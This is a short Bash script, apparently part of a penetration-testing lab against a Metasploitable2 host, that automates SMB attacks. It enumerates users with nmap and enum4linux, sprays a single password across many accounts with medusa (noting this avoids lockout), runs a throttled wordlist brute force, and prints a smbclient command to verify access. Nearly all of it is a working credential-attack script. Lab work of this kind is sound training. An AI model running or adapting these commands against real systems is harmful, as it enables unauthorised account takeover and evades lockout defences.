#!/bin/bash
# Cenário 3 - SMB Password Spraying + Enumeração - Lab riad
# Uso: ./commands/smb-medusa.sh 192.168.56.101
BASEDIR="$(cd "$(dirname "$0")/.." && pwd)"
SMB_USERS="$BASEDIR/wordlists/smb-users.txt"
WORDLIST_P="$BASEDIR/wordlists/passwords.txt"
IP_MS2="${1:-<IP-MS2>}"
echo "[*] SMB enum + spraying contra $IP_MS2"
echo "[1/3] Enumeração de usuários:"
nmap --script smb-enum-users -p 445 "$IP_MS2"
enum4linux -U "$IP_MS2" || true
echo "[2/3] Password spraying (1 senha contra muitos usuários - evita lockout):"
medusa -h "$IP_MS2" -U "$SMB_USERS" -p password -M smbnt -v 6
echo "[3/3] Força total controlada (throttle -t 1):"
medusa -h "$IP_MS2" -U "$SMB_USERS" -P "$WORDLIST_P" -M smbnt -v 6 -t 1
echo ""
echo "[*] Validar:"
echo "smbclient //$IP_MS2/tmp -U user%senha"
